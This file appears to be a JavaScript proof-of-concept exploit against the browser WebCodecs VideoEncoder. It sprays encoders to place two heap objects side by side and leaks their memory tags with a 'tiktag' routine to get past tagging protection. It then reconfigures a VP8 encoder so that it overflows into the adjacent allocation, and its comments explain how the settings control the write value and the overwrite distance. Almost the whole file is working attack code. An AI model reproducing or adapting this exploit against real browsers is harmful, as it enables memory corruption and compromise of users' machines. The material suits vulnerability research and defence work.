// this string size +0x34, fits into 0x180 bucket
const kCSSString = 'A'.repeat(0x34);
const kCSS100 = 'A'.repeat(0x34);
const BIQUADS_SIZE = 0x10;
imageDecoders = [];

const NUM_SPRAY = 20;
const NUM_FREE = 8;
const OBJ_SIZE = 0x180;
// const OBJ_SIZE = 0x80;

const MAX_TRIAL = 10;
function gc() {
  for (let i = 0; i < 200; i++) {
    new ArrayBuffer(1024*1024*32);
  }
}

function sleep(ms) {
    return new Promise(r=>setTimeout(r, ms));
}

function reportError(e) {
  // Report error to the main thread
  console.log(e.message);
  postMessage(e.message);
}

// This determines the bounds of our write value and overwrite length
const config_init = {
  codec: "vp8",
  width: 900,    // This value determines our maximum uint32 write value
  height: 4096,   // This value determines our maximum height aka max overflowing amount
};

// Determines the size of the allocation we are overflowing
const victim_height = 1408;
const config_victim = {
  codec: "vp8",
  // Requirement: 307200 <= width*height
  // Requirement: config_init.width >= width
  // Requirement: config_init.height >= height
  width: 900,    // cols = ceil(width/16)
  height: victim_height,  // rows = ceil(height/16)
};

// Overflows the previous allocation
const config_attack = {
  codec: "vp8",
  // Requirement: 307200 > width * height.
  // Requirement: config_init.width >= width > 15
  // Requirement: config_init.height >= height
  // Requirement: ceil(config_victim.height/16) < ceil(height/16)
  width:  16,   // cols' = ceil(width/16).  Controls the u32 value we write.
  height: victim_height+16*32,  // rows' = ceil(height/16). Controls how far we overwrite. overwrite = rows'-rows
  // height: victim_height+16*0,  // rows' = ceil(height/16). Controls how far we overwrite. overwrite = rows'-rows

};

// If we switch too fast then attack fails
const config_change_timeout = 1000;
const config_leak_timeout = 500;
let encoders = new Array(NUM_SPRAY);
let victim_enc, target_enc;

function captureAndEncode() {
  function processChunk(chunk, md) {
  };

  function terminate(err) {
    console.log(err);
  }

  const init = {
    output: processChunk,
    error: reportError,
    codec: "vp8"
  };

  // Initial init
  let addr_list = [];
  let victim_tag = -1;
  let target_tag = -1;
  let retry = 0;
  let realloc = 0;

  // Dummy frame used to call encoder
  let vfInit = {format: 'NV12', timestamp: 0, codedWidth: 4, codedHeight: 2};
  let data = new Uint8Array([
    1, 2, 3, 4, 5, 6, 7, 8,  // y
    1, 2, 3, 4,              // uv
  ]);

  async function spray_video_encoder() {
    
    for(let i=0; i < 32; ++i) {
      let enc = new VideoEncoder(init);
      enc.configure(config_init);
      encoders[i] = enc;
    }

    await sleep(1000);
    for(let i=0; i < NUM_SPRAY; ++i) {
      encoders[i].configure(config_victim);
    }

    await sleep(1000);
    for (let i=0; i < NUM_SPRAY; ++i) {
        tagged_addr = BigInt(encoders[i].getAddress());
        addr = Number(tagged_addr & 0xffffffffffffn);
        tag = Number((tagged_addr >> 56n) & 0xfn);
        addr_list.push({addr: addr, tag: tag, idx: i});
    }

    // sort addr_list
    addr_list.sort((a, b) => a.addr - b.addr);

    for (let i=0; i < NUM_SPRAY; ++i) {
      if (i < NUM_SPRAY-1) {
        if ((addr_list[i+1].addr - addr_list[i].addr) <= OBJ_SIZE) {
          victim_enc = addr_list[i];
          target_enc = addr_list[i+1];
          break;
        }
      }
    }

    if (victim_enc == undefined || target_enc == undefined) {
      terminate("Failed to find adjacent addrs")
      return -1;
    }

    console.log("&vuln   = 0x" + victim_enc.addr.toString(16));
    console.log("&target = 0x" + target_enc.addr.toString(16));

    for (let i=0; i < NUM_SPRAY; ++i) {
      if (i != victim_enc.idx && i != target_enc.idx) {
        encoders[i].close();
        encoders[i] = undefined;
      }
    }
    await sleep(1000);
    return 0;
  }

  async function initialize_encoder() {
    console.log("===== Initialize =====")

    res = await spray_video_encoder();
    if (res == -1) {
      return;
    }
    await setup();

    let trial = 0;
    let frame = new VideoFrame(data, vfInit);
    console.log("===== Leak vuln's tag =====")

    
    while ((trial++ < MAX_TRIAL) && (victim_tag == -1)) {
      await sleep(config_leak_timeout);
      core = %SetCore(4);
      encoders[victim_enc.idx].encode(frame, { keyFrame: true });
      
      // MANUAL
      // tagged_addr = BigInt(encoders[victim_enc.idx].getAddress());
      // addr = Number(tagged_addr & 0xffffffffffffn);
      // victim_tag = Number((tagged_addr >> 56n) & 0xfn);
      
      // TIKTAG
      victim_tag = await tiktag(BigInt(victim_enc.addr+0x40), victim_enc.idx);
    } 
    frame.close();

    if (victim_tag == -1) {
      terminate("TagLeak(&vuln) failed.");
      return;
    }
    console.log("===== Leaked vuln's tag! ("+victim_tag.toString(16)+") =====")
    console.log("");
    await sleep(config_change_timeout);
    // Prepare our victim allocation
    setTimeout(prepare_target, config_change_timeout);

  };

  // leak tag of the target.
  // reallocate the target until its tag matches with the victim's tag.
  async function prepare_target() {

    let trial = 0;

    target_tag = -1;
    console.log("===== Leak target's tag =====")

    let frame = new VideoFrame(data, vfInit);
    while ((trial++ < MAX_TRIAL) && (target_tag == -1)) {
      await sleep(config_leak_timeout);
      // Ensure our target is re-allocated
      encoders[target_enc.idx].encode(frame, { keyFrame: true });

      // MANUAL
      // tagged_addr = BigInt(encoders[victim_enc.idx].getAddress()+0x40);
      // addr = Number(tagged_addr & 0xffffffffffffn);
      // victim_tag = Number((tagged_addr >> 56n) & 0xfn);

      // TIKTAG
      target_tag = await tiktag(BigInt(target_enc.addr+0x40), target_enc.idx);
    }
    frame.close();
    
    if (target_tag == -1) {
      if (retry++ > 10) {
        terminate("TagLeak(&target) failed.");
        return;
      }
    }

    if (target_tag != victim_tag) {
      // Reallocate the victim.
      console.log("vuln tag ("+victim_tag.toString(16)+") != target tag ("+target_tag.toString(16)+")");
      console.log("Reallocate the target...")
      console.log("");
      config_victim.height = victim_height + (++realloc & 1) * 16;
      encoders[target_enc.idx].configure(config_victim);
      setTimeout(prepare_target, config_change_timeout);
    } else {
      console.log("vuln tag ("+victim_tag.toString(16)+") == target tag ("+target_tag.toString(16)+")");
      console.log("");

      setTimeout(prepare_attack, config_change_timeout);
    }
  };

  async function prepare_attack() {
    let frame = new VideoFrame(data, vfInit);
    // Ensure our victim is allocated
    encoders[victim_enc.idx].encode(frame, { keyFrame: true });
    frame.close();
    vfInit.timestamp += 100;
    // Now here's our attacking config
    encoders[victim_enc.idx].configure(config_attack);

    setTimeout(overflow, config_change_timeout);
  }


  async function overflow() {
    // console.log("Overflowing");
    console.log("===== Overflow vuln =====");
    console.log("&vuln   = 0x" + victim_enc.addr.toString(16));
    console.log("&target = 0x" + target_enc.addr.toString(16));
    let frame = new VideoFrame(data, vfInit);
    // Overwrite the victim allocation
    encoders[victim_enc.idx].encode(frame, { keyFrame: true });
    frame.close();
  };


  setTimeout(initialize_encoder, config_change_timeout);

}

async function exploit() {
  if (!("VideoFrame" in window)) {
    document.body.innerHTML = "<h1>WebCodecs API is not supported.</h1>";
    return;
  }

  captureAndEncode();

}